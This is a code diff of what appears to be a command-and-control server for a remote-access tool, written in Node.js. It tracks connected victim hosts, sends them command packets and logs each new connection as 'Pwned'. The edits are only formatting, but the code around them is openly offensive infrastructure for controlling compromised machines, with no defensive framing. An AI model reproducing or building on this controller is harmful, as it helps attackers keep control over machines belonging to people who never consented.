@@ -1,8 +1,11 @@
 const { Socket } = require('net');
 const { ZlibConnection } = require('../protocol/connection');
 const { packet_types } = require('../protocol/protocol');
-const { createPacket } = require('../protocol/packet');
-const { parsePacket, serializePacket } = require('../protocol/packet');
+const {
+    createPacket,
+    parsePacket,
+    serializePacket,
+} = require('../protocol/packet');
 const { controllers } = require('./control');
 
 const hosts = [];
@@ -22,7 +25,7 @@ class Host {
     /**
      * Handle response from this host
      * ! Not meant to be called outside of this class !
-     * @param {*} packet 
+     * @param {*} packet
      */
     handleResponse(packet) {
         let wrappedPkt = {
@@ -40,7 +43,7 @@ class Host {
 
     /**
      * Send packet to this host
-     * @param {*} packet 
+     * @param {*} packet
      */
     sendCommand(packet) {
         this.connection.write(serializePacket(packet));
@@ -56,11 +59,17 @@ function handleIncomingHost(socket) {
     console.log(`[+] Pwned ${socket.remoteAddress} ;)`);
     socket.on('close', () => {
         console.log(`[-] Host ${socket.remoteAddress} disconnected`);
-        hosts.splice(hosts.findIndex(i => i == host), 1);
+        hosts.splice(
+            hosts.findIndex((i) => i == host),
+            1
+        );
     });
     socket.on('error', () => {
         console.log(`[!] Host ${socket.remoteAddress} forcibly exited`);
-        hosts.splice(hosts.findIndex(i => i == host), 1);
+        hosts.splice(
+            hosts.findIndex((i) => i == host),
+            1
+        );
     });
     let packet = createPacket('control', 'response', 'newpwn');
     packet.ip = socket.remoteAddress;
